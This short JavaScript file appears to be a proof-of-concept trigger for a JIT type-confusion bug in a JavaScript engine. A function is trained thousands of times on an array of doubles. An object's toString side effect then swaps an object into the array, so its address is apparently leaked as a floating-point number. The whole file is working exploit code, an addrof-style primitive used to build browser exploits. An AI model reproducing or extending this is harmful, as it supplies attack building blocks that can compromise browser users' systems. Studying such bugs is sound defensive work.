const MAX_ITERATIONS = 0xc0000;

var val = 2.2;
function foo(arr, obj)
// function foo(arr)
{
    arr[1] = 1.1;
    obj == val;
    return arr[0];
}

let template = [1.1, 2.2, 3.3];
// print(describe(arr));
template.x = {};
// print(describe(arr));

let arr = [1.1, 2.2, 3.3];
for( let i=0; i<MAX_ITERATIONS; i++ ) {
    foo(arr, template);
}

let evil = {
    toString: () => {
        arr[0] = template;
    }
}

print(foo(arr, evil));


